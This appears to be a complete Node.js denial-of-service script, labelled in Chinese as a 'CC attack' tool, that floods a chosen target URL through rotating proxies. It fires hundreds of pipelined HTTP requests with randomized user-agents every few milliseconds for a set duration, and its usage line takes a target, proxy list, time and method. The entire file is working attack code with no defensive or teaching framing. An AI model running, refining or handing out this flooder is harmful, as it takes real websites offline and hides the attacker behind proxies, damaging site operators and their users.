process.on('uncaughtException', function() {});
process.on('unhandledRejection', function() {});
const net = require('net');
const fs = require('fs');
const url = require('url');
var path = require("path");
const execSync = require('child_process').execSync;
try {
    var colors = require('colors');
} catch (err) {
    console.log('\x1b[36mInstalling\x1b[37m the requirements');
    execSync('npm install colors');
    console.log('Done.');
    process.exit();
}
var fileName = __filename;
var file = path.basename(fileName);
try {
    var proxies = fs.readFileSync(process.argv[3], 'utf-8').toString().replace(/\r/g, '').split('\n');
} catch (err) {
    if (err.code !== 'ENOENT') throw err;
    console.log('\x1b[31m Error\x1b[37m: Proxy list not found.');
    console.log("\x1b[36m usage\x1b[37m: node " + file + " <Target> <proxies> <duration> <method>");
    process.exit();
}

var target = process.argv[2];
var methods = process.argv[5];
var parsed = url.parse(target);

setTimeout(() => {
    process.exit(1);
}, process.argv[4] * 1000);


const UAs = fs.readFileSync('ua.txt', 'utf-8').match(/\S+/g);

setInterval(function() {
    var proxy = proxies[Math.floor(Math.random() * proxies.length)];
    proxy = proxy.split(':');
    var socket = net.connect(proxy[1], proxy[0]);
    socket.setKeepAlive(true, 5000)
    socket.setTimeout(5000);
    socket.once('error', err => {
        // console.log('Error : ' + proxy[0] + ":" + proxy[1]);
    });
    socket.once('disconnect', () => {
        console.log('Disconnect');
    });
    socket.once('data', data => {
        // console.log('Connected : ' + proxy[0] + ":" + proxy[1]);
    });
    for (let j = 0; j < 180; j++) {
        socket.write(methods + " " + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
        socket.write(methods + " " + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
    }
    socket.on('data', function() {
        setTimeout(function() {
            socket.destroy();
            return delete socket;
        }, 130000);
    })
}, 15);

if (!process.argv[4]) {
    console.log("\x1b[31m Error\x1b[37m: provide time duration");
    console.log("\x1b[36m usage\x1b[37m: node " + file + " <Target> <proxies> <duration><method>");
    process.exit();
}

if (isNaN(process.argv[4])) {
    console.log("\x1b[31m Error\x1b[37m: enter valid time duration");
    console.log("\x1b[36m usage\x1b[37m: node " + file + " <Target> <proxies> <duration> <method>");
    process.exit();
}

if (!process.argv[2] !== !process.argv[2].startsWith('http://') && !process.argv[2].startsWith('https://')) {
    console.log("\x1b[31m Error\x1b[37m: enter valid target");
    console.log("\x1b[36m usage\x1b[37m: node " + file + " <Target> <proxies> <duration> <method>");
    process.exit();
}

console.log("云溪CC-TCP脚本".rainbow);
console.log
("\x1b[36m模式\x1b[37m %s| " + "\x1b[35m" + parsed.host + "\x1b[37m",process.argv[5]);
console.log("CC攻击发起成功,本次攻击时间为%s 秒", process.argv[4]);